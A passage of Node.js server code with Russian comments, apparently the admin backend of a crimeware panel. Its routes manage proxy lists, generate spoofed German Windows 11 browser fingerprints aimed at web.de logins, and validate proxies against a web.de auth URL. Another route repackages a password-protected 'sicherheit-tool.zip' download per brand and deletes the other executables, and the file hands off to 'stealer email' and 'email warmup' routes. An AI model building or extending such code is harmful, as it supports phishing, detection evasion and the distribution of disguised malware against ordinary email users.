        if (!Object.prototype.hasOwnProperty.call(json, 'content')) {
          return send(res, 200, { ok: true });
        }
      }
      const content = json.content != null ? String(json.content) : '';
      if (!Object.prototype.hasOwnProperty.call(json, 'content')) {
        return send(res, 400, { ok: false, error: 'content required for proxy save' });
      }
      try {
        let oldProxyContent = '';
        try {
          if (fs.existsSync(PROXY_FILE)) oldProxyContent = fs.readFileSync(PROXY_FILE, 'utf8');
        } catch (_) {}
        // Нормализуем строки прокси в формат host:port:login:password, чтобы скрипты могли читать единообразно.
        const normalizedContent = String(content || '')
          .split(/\r?\n/)
          .map((line) => {
            const raw = String(line || '');
            const t = raw.trim();
            if (!t) return '';
            if (t.startsWith('#')) return raw;
            const parsed = normalizeProxyLine(t);
            return parsed ? parsed.normalized : raw;
          })
          .join('\n');
        const dir = path.dirname(PROXY_FILE);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(PROXY_FILE, normalizedContent, 'utf8');
        const lineCount = normalizedContent.split(/\r?\n/).filter(function (l) {
          const t = (l || '').trim();
          return t.length > 0 && !t.startsWith('#');
        }).length;
        console.log('[CONFIG] Сохранён proxy.txt: ' + PROXY_FILE + ', непустых строк: ' + lineCount);
        try {
          const oldRows = parseProxyRowsForStatsReset(oldProxyContent);
          const newRows = parseProxyRowsForStatsReset(normalizedContent);
          const oldSet = new Set(oldRows.map((r) => r.normalized));
          const newSet = new Set(newRows.map((r) => r.normalized));
          const touchedServers = new Set();
          // Сбрасываем только реально изменившиеся/добавленные/удалённые прокси.
          // Перестановка строк (reorder) не должна стирать статистику.
          oldRows.forEach((row) => {
            if (!row || !row.server) return;
            if (!newSet.has(row.normalized)) touchedServers.add(row.server);
          });
          newRows.forEach((row) => {
            if (!row || !row.server) return;
            if (!oldSet.has(row.normalized)) touchedServers.add(row.server);
          });
          touchedServers.forEach((server) => { deleteProxyFpStatsByProxy(server); });
        } catch (_) {}
      } catch (e) {
        return send(res, 500, { ok: false, error: (e && e.message) || 'Failed to write proxy file' });
      }
      return send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/config/webde-fingerprint-indices' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const probeJobId = (q.probeJobId != null && String(q.probeJobId).trim()) ? String(q.probeJobId).trim() : '';
    if (probeJobId) {
      return sendWebdeFingerprintProbeStatus(res, probeJobId);
    }
    let content = '';
    try {
      if (fs.existsSync(WEBDE_FP_INDICES_FILE)) content = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
    } catch (e) {}
    const poolPayload = buildWebdeFingerprintsListPayload();
    return send(res, 200, {
      content,
      pool: poolPayload,
    });
  }

  if (pathname === '/api/config/webde-fingerprint-indices' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      if (json.probePause === true || json.probePause === 'true' || json.probePause === 1) {
        return handleWebdeFingerprintProbePause(res, json);
      }
      if (json.probeResume === true || json.probeResume === 'true' || json.probeResume === 1) {
        return handleWebdeFingerprintProbeResume(res, json);
      }
      if (json.probeStart === true || json.probeStart === 'true' || json.probeStart === 1) {
        return handleWebdeFingerprintProbeStart(res, json);
      }
      const content = json.content != null ? String(json.content) : '';
      let oldContent = '';
      try {
        if (fs.existsSync(WEBDE_FP_INDICES_FILE)) oldContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
      } catch (_) {}
      try {
        const dir = path.dirname(WEBDE_FP_INDICES_FILE);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(WEBDE_FP_INDICES_FILE, content, 'utf8');
        const lineCount = content.split(/\r?\n/).filter(function (l) {
          const t = (l || '').trim();
          return t.length > 0 && !t.startsWith('#');
        }).length;
        console.log('[CONFIG] Сохранён webde_fingerprint_indices.txt: ' + WEBDE_FP_INDICES_FILE + ', строк: ' + lineCount);
      } catch (e) {
        return send(res, 500, { ok: false, error: (e && e.message) || 'Failed to write fingerprint indices file' });
      }
      try {
        const oldSet = new Set(parseFingerprintIndicesContent(oldContent));
        const newSet = new Set(parseFingerprintIndicesContent(content));
        const touched = new Set();
        oldSet.forEach((n) => { if (!newSet.has(n)) touched.add(n); });
        newSet.forEach((n) => { if (!oldSet.has(n)) touched.add(n); });
        touched.forEach((n) => { deleteProxyFpStatsByFingerprint(n); });
      } catch (_) {}
      return send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/config/webde-fingerprints-list' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    return send(res, 200, buildWebdeFingerprintsListPayload());
  }

  if (pathname === '/api/config/webde-fingerprints-generate-de' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    const projectRoot = path.join(__dirname, '..', '..');
    const scriptPath = path.join(projectRoot, 'scripts', 'build-webde-fingerprints-de-win11.mjs');
    const poolJsonPath = path.join(projectRoot, 'login', 'webde_fingerprints.json');
    if (!fs.existsSync(scriptPath)) {
      return send(res, 500, { ok: false, error: 'Fingerprint generator script not found: ' + scriptPath });
    }
    let oldPool = [];
    try {
      if (fs.existsSync(poolJsonPath)) {
        const rawOld = fs.readFileSync(poolJsonPath, 'utf8');
        const parsedOld = JSON.parse(rawOld);
        oldPool = Array.isArray(parsedOld) ? parsedOld : [];
      }
    } catch (_) {
      oldPool = [];
    }
    try {
      const seed = String(Date.now());
      const r = spawnSync(process.execPath, [scriptPath, '--seed=' + seed, '--count=100'], {
        cwd: projectRoot,
        encoding: 'utf8',
        env: process.env,
        timeout: 120000,
      });
      if (r.error) {
        return send(res, 500, { ok: false, error: (r.error && r.error.message) ? r.error.message : 'spawn error' });
      }
      if (r.status !== 0) {
        const out = ((r.stdout || '') + '\n' + (r.stderr || '')).trim();
        return send(res, 500, { ok: false, error: 'Fingerprint generator failed', output: out.slice(0, 4000) });
      }
    } catch (e) {
      return send(res, 500, { ok: false, error: (e && e.message) ? e.message : String(e) });
    }
    let newPool = [];
    try {
      if (fs.existsSync(poolJsonPath)) {
        const rawNew = fs.readFileSync(poolJsonPath, 'utf8');
        const parsedNew = JSON.parse(rawNew);
        newPool = Array.isArray(parsedNew) ? parsedNew : [];
      }
    } catch (_) {
      newPool = [];
    }
    // Если отпечаток под тем же индексом изменился — стата этого индекса устарела.
    try {
      const maxLen = Math.max(oldPool.length, newPool.length);
      for (let i = 0; i < maxLen; i++) {
        const oldSig = oldPool[i] != null ? JSON.stringify(oldPool[i]) : '';
        const newSig = newPool[i] != null ? JSON.stringify(newPool[i]) : '';
        if (oldSig !== newSig) deleteProxyFpStatsByFingerprint(i);
      }
    } catch (_) {}
    let pool = null;
    try { pool = buildWebdeFingerprintsListPayload(); } catch (e2) { pool = null; }
    // После генерации сбрасываем active-indices на весь новый пул,
    // чтобы в UI не оставался старый "обрезанный" список.
    try {
      const entries = (pool && Array.isArray(pool.entries)) ? pool.entries : [];
      if (entries.length > 0) {
        const content = entries.map(function (e) { return String(e.index); }).join('\n') + '\n';
        const dir = path.dirname(WEBDE_FP_INDICES_FILE);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(WEBDE_FP_INDICES_FILE, content, 'utf8');
      }
      try { pool = buildWebdeFingerprintsListPayload(); } catch (e3) {}
    } catch (eWrite) {
      return send(res, 500, {
        ok: false,
        error: 'Fingerprints generated, but failed to reset indices: ' + ((eWrite && eWrite.message) ? eWrite.message : String(eWrite)),
      });
    }
    return send(res, 200, {
      ok: true,
      pool,
      fingerprintCount: newPool.length,
      replacedAll: true,
    });
  }

  if (pathname === '/api/config/webde-fingerprint-probe-start' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      return handleWebdeFingerprintProbeStart(res, json);
    });
    return true;
  }

  if (pathname === '/api/config/webde-fingerprint-probe-status' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const jobId = (q.jobId != null && String(q.jobId).trim()) ? String(q.jobId).trim() : '';
    return sendWebdeFingerprintProbeStatus(res, jobId);
  }

  /** Только выдача пула отпечатков + индексов (без проверки прокси). GET + query — если POST-тело режется прокси. */
  if (pathname === '/api/config/proxies-validate' && req.method === 'GET') {
    const q = (parsed && parsed.query) || {};
    if (q.webdeFpBundle === '1' || q.webdeFpBundle === 'true' || q.webdeFpBundle === 'yes') {
      if (!checkAdminAuth(req, res)) return;
      let indicesContent = '';
      try {
        if (fs.existsSync(WEBDE_FP_INDICES_FILE)) indicesContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
      } catch (e) {}
      const poolPayload = buildWebdeFingerprintsListPayload();
      return send(res, 200, {
        valid: [],
        invalid: [],
        webdeIndices: { content: indicesContent, pool: poolPayload },
      });
    }
  }

  /** Проверка прокси: сначала TCP, при отказе — HTTPS через прокси (реальный запрос). */
  if (pathname === '/api/config/proxies-validate' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const pq = (parsed && parsed.query) || {};
      const content = json.content != null ? String(json.content) : '';
      const lines = content.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
      const valid = [];
      const invalid = [];
      const timeoutMs = Math.min(15000, Math.max(3000, parseInt(json.timeoutMs, 10) || 8000));
      const testUrl = proxyAuthWebValidate.DEFAULT_WEBDE_AUTH_TEST_URL;

      function testProxyTcp(parsed) {
        return new Promise((resolve) => {
          const socket = net.createConnection(parsed.port, parsed.host, () => {
            socket.destroy();
            resolve({ ok: true });
          });
          socket.setTimeout(Math.min(timeoutMs, 5000));
          socket.on('timeout', () => {
            socket.destroy();
            resolve({ ok: false, error: 'TCP: таймаут до ' + parsed.host + ':' + parsed.port });
          });
          socket.on('error', (err) => {
            const em = (err && err.message) ? String(err.message) : 'Ошибка подключения';
            resolve({ ok: false, error: 'TCP к ' + parsed.host + ':' + parsed.port + ': ' + em });
          });
        });
      }

      async function testHttpsThroughHttpProxy(parsed, PaCtor) {
        if (!PaCtor) return { ok: false, error: 'Модуль https-proxy-agent не загружен' };
        const proxyUrl = proxyAuthWebValidate.buildHttpProxyUrl(parsed);
        const agent = new PaCtor(proxyUrl, { timeout: timeoutMs });
        return proxyAuthWebValidate.httpsGetStatusThroughAgent(agent, testUrl, timeoutMs);
      }

      async function testHttpsThroughSocks(parsed, socksVariant) {
        const SocksCls = getSocksProxyAgentClass();
        if (!SocksCls) return { ok: false, error: 'Модуль socks-proxy-agent не установлен' };
        const uri = proxyAuthWebValidate.buildSocksProxyUri(parsed, socksVariant);
        const agent = new SocksCls(uri, { timeout: timeoutMs });
        return proxyAuthWebValidate.httpsGetStatusThroughAgent(agent, testUrl, timeoutMs);
      }

      const includeWebdeFpBundle =
        pq.webdeFpBundle === '1' ||
        pq.webdeFpBundle === 'true' ||
        pq.webdeFpBundle === 'yes' ||
        json.includeWebdeFpBundle === true ||
        json.includeWebdeFpBundle === 'true' ||
        json.includeWebdeFpBundle === 1;

      /** Параллель по чанкам: меньше шанс упереться в proxy_read_timeout nginx при длинном списке. */
      const PROXY_VALIDATE_CONCURRENCY = 6;

      async function checkOneProxyLine(line) {
        if (line.startsWith('#')) return { kind: 'skip' };
        const parsed = normalizeProxyLine(line);
        if (!parsed) {
          return {
            kind: 'invalid',
            row: { line, error: 'Неверный формат (host:port[:login:password] или login:password:host:port, разделители : ; |)' },
          };
        }
        const tcpResult = await testProxyTcp(parsed);
        if (!tcpResult.ok) {
          return {
            kind: 'invalid',
            row: { line, error: tcpResult.error || 'TCP недоступен', normalized: parsed.normalized },
          };
        }
        const PaCtor = await getHttpsProxyAgentCtor();
        const SocksCls = getSocksProxyAgentClass();

        const schemes = [];
        if (parsed.scheme === 'socks5') schemes.push('socks5');
        else if (parsed.scheme === 'socks4') schemes.push('socks4');
        else if (parsed.scheme === 'http') schemes.push('http');
        else {
          schemes.push('http');
          schemes.push('socks5');
        }

        if (parsed.scheme === 'http' && !PaCtor) {
          return { kind: 'valid', row: { line, normalized: parsed.normalized } };
        }
        if ((parsed.scheme === 'socks5' || parsed.scheme === 'socks4') && !SocksCls) {
          return {
            kind: 'invalid',
            row: {
              line,
              normalized: parsed.normalized,
              error: 'Установите пакет socks-proxy-agent (npm i) или укажите http:// для HTTP-прокси',
            },
          };
        }
        if (!PaCtor && !SocksCls) {
          return { kind: 'valid', row: { line, normalized: parsed.normalized } };
        }

        let lastErr = 'HTTPS через прокси не прошёл';
        for (let si = 0; si < schemes.length; si++) {
          const sch = schemes[si];
          let r = null;
          if (sch === 'http') {
            if (!PaCtor) continue;
            r = await testHttpsThroughHttpProxy(parsed, PaCtor);
          } else if (sch === 'socks5') {
            if (!SocksCls) {
              lastErr = 'Модуль socks-proxy-agent не установлен';
              continue;
            }
            r = await testHttpsThroughSocks(parsed, 'socks5');
          } else if (sch === 'socks4') {
            if (!SocksCls) {
              lastErr = 'Модуль socks-proxy-agent не установлен';
              continue;
            }
            r = await testHttpsThroughSocks(parsed, 'socks4');
          }
          if (r && r.ok) {
            const row = { line, normalized: parsed.normalized };
            if (r.warn403 && r.warn) row.warn = r.warn;
            return { kind: 'valid', row };
          }
          if (r && r.error) lastErr = r.error;
        }
        return {
          kind: 'invalid',
          row: { line, error: lastErr, normalized: parsed.normalized },
        };
      }

      (async () => {
        try {
          for (let off = 0; off < lines.length; off += PROXY_VALIDATE_CONCURRENCY) {
            const chunk = lines.slice(off, off + PROXY_VALIDATE_CONCURRENCY);
            const chunkOut = await Promise.all(chunk.map((ln) => checkOneProxyLine(ln)));
            for (const one of chunkOut) {
              if (!one || one.kind === 'skip') continue;
              if (one.kind === 'valid') valid.push(one.row);
              else if (one.kind === 'invalid') invalid.push(one.row);
            }
          }
          const out = { valid, invalid };
          if (includeWebdeFpBundle) {
            let indicesContent = '';
            try {
              if (fs.existsSync(WEBDE_FP_INDICES_FILE)) indicesContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
            } catch (e) {}
            let poolPayload = null;
            try {
              poolPayload = buildWebdeFingerprintsListPayload();
            } catch (eFp) {
              out.webdeIndices = {
                content: indicesContent,
                pool: null,
                poolError: (eFp && eFp.message) ? String(eFp.message) : String(eFp),
              };
            }
            if (poolPayload != null) out.webdeIndices = { content: indicesContent, pool: poolPayload };
          }
          return send(res, 200, out);
        } catch (eRun) {
          console.error('[CONFIG] proxies-validate failed:', eRun);
          return send(res, 500, {
            ok: false,
            error: (eRun && eRun.message) ? String(eRun.message) : 'proxies_validate_failed',
          });
        }
      })().catch((eTop) => {
        console.error('[CONFIG] proxies-validate unhandled:', eTop);
        try {
          if (!res.writableEnded) {
            send(res, 500, { ok: false, error: (eTop && eTop.message) ? String(eTop.message) : 'proxies_validate_unhandled' });
          }
        } catch (_) {}
      });
    });
    return true;
  }

  if (pathname === '/api/config/zip-process' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const sourceRaw = (json.sourceFileName || '').trim().replace(/\0/g, '');
      const sourceKey =
        downloadKit.normalizeStoredDownloadKey(sourceRaw) ||
        downloadKit.normalizeStoredDownloadKey(path.basename(sourceRaw.replace(/\.\./g, '')));
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      let newZipName = (json.newZipName || '').trim().replace(/[^a-zA-Z0-9._-]/g, '') || 'sicherheit-tool.zip';
      if (!newZipName.toLowerCase().endsWith('.zip')) newZipName += '.zip';
      const renames = json.renames && typeof json.renames === 'object' ? json.renames : {};
      const zipProcBrand = downloadKit.normalizeDownloadKitBrand(json.downloadBrand != null ? json.downloadBrand : json.brand);
      const sourcePath = sourceKey ? downloadKit.resolveDownloadFileFullPath(sourceKey) : null;
      if (!sourceKey || !sourcePath || !fs.existsSync(sourcePath) || path.extname(sourcePath).toLowerCase() !== '.zip') {
        return send(res, 400, { ok: false, error: 'Source zip not found or not a zip' });
      }
      const tempDir = path.join(os.tmpdir(), 'gmw-zip-' + Date.now());
      const outZipPath = path.join(os.tmpdir(), 'gmw-out-' + Date.now() + '.zip');
      try {
        fs.mkdirSync(tempDir, { recursive: true });
        const envOld = { ...process.env, GMW_ZIP_OLD: currentPassword };
        const unzipCmd = 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(sourcePath) + ' -d ' + JSON.stringify(tempDir);
        const unzipRun = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld });
        const extracted = fs.readdirSync(tempDir).length > 0;
        if (!extracted) {
          const errMsg = (unzipRun.stderr || unzipRun.stdout || '').toString().trim();
          const friendly = /wrong password|incorrect password|bad password|пароль/i.test(errMsg) ? 'Неверный пароль от архива.' : 'Не удалось распаковать архив. Проверьте пароль.';
          return send(res, 500, { ok: false, error: friendly });
        }
        const renameList = Array.isArray(renames) ? renames : Object.entries(renames).map(([k, v]) => ({ from: k, to: v }));
        function safeSegment(name) {
          const s = (name || '').replace(/\.\./g, '').replace(/^[/\\]+/, '');
          return s || null;
        }
        for (const r of renameList) {
          const from = safeSegment(r.from || r[0] || '');
          const to = safeSegment(r.to || r[1] || '');
          if (!from || !to || from === to) continue;
          const oldP = path.join(tempDir, from);
          const newP = path.join(tempDir, to);
          if (path.relative(tempDir, oldP).startsWith('..') || path.relative(tempDir, newP).startsWith('..')) continue;
          if (fs.existsSync(oldP)) {
            fs.renameSync(oldP, newP);
          }
        }
        const envNew = { ...process.env, GMW_ZIP_NEW: newPassword };
        execSync('cd ' + JSON.stringify(tempDir) + ' && zip -r -P "$GMW_ZIP_NEW" ' + JSON.stringify(outZipPath) + ' .', { shell: true, env: envNew });
        const brandOutDir = path.join(DOWNLOADS_DIR, zipProcBrand);
        if (!fs.existsSync(brandOutDir)) fs.mkdirSync(brandOutDir, { recursive: true });
        const finalPath = path.join(brandOutDir, newZipName);
        fs.copyFileSync(outZipPath, finalPath);
        const names = fs.readdirSync(brandOutDir);
        for (let i = 0; i < names.length; i++) {
          const n = names[i];
          const lower = n.toLowerCase();
          if ((lower.endsWith('.exe') || lower.endsWith('.zip')) && n !== newZipName) {
            try { fs.unlinkSync(path.join(brandOutDir, n)); } catch (e) {}
          }
        }
        if (typeof writeZipPasswordForBrand === 'function') writeZipPasswordForBrand(zipProcBrand, newPassword);
        else writeZipPassword(newPassword);
        send(res, 200, { ok: true, fileName: zipProcBrand + '/' + newZipName });
      } catch (e) {
        const msg = (e.stderr && e.stderr.toString()) || e.message || String(e);
        let friendly = msg.length > 80 ? 'Ошибка при обработке архива.' : msg;
        if (/zip:\s*not found|command not found.*zip/i.test(msg)) {
          friendly = 'На сервере не установлена программа zip. Установите: apt install zip (или yum install zip)';
        }
        send(res, 500, { ok: false, error: friendly });
      } finally {
        try {
          if (fs.existsSync(tempDir)) {
            const left = fs.readdirSync(tempDir);
            for (const f of left) fs.unlinkSync(path.join(tempDir, f));
            fs.rmdirSync(tempDir);
          }
          if (fs.existsSync(outZipPath)) fs.unlinkSync(outZipPath);
        } catch (e) {}
      }
    });
    return true;
  }

  if (handleConfigStealerEmailRoutes(scope)) return true;

  if (handleConfigEmailWarmupRoutes(scope)) return true;


  }
  return false;
}

module.exports = { handle };
